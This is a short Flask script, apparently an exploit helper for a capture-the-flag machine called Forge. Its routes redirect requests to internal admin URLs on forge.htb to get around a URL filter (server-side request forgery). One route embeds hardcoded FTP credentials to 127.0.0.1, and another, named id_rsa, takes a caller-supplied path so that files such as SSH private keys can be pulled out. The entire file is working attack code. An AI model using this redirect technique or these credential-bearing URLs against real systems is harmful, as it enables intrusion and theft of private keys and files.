from flask import request,Flask,redirect

app = Flask(__name__)

@app.route("/")
def admin():
    return redirect("http://admin.forge.htb")

@app.route("/1")
def announcements():
    return redirect("http://admin.forge.htb/announcements")

@app.route("/2")
def ftp():
    return redirect("http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/")

@app.route("/3")
def id_rsa():
    f = request.args.get('f', default='')
    return redirect(f'http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/{f}')

#test
if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0",port=80)
